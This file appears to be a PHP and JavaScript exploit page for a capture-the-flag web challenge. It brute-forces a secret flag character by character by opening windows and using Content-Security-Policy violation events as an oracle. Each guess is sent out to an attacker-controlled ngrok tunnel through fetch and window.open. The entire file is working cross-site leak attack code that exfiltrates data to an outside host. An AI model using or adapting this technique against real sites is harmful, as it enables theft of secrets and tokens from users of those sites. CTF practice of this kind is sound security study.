<?php
$test = isset($_GET['test']) ? $_GET['test'] : '';
$flag = isset($_GET['flag']) ? $_GET['flag'] : '';


?>
<!-- http://web2.africacryptctf.online:1337/ -->
<?php if ($flag !== ''): ?>
<script>
let charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
for (let i = 0; i < charset.length; i++) {
    window.open("http://0.tcp.eu.ngrok.io:12414/?test=" + "<?= $flag ?>" + charset[i]);
}
</script>
<?php endif; ?>
<?php if ($flag != '') { die(); } ?>



<?php header("Content-Security-Policy: form-action http://web2.africacryptctf.online:80");?>
<!-- <meta http-equiv="Content-Security-Policy" content="form-action http://web2.africacryptctf.online:80"> -->
<form action="http://web2.africacryptctf.online:80/search" method="get">
    <input type="text" name="query" value="<?= $test ?>">
    <input type="submit" name="query" value="<?= $test ?>">
</form>


<script>
    document.addEventListener('securitypolicyviolation', () => {
        console.log("CSP violation!")
        
        fetch("http://0.tcp.eu.ngrok.io:12414?flag=<?= $test ?>",{
            mode:"no-cors",
            credenetials:"include",
        })
    });

    // document.forms[0].submit();
</script>

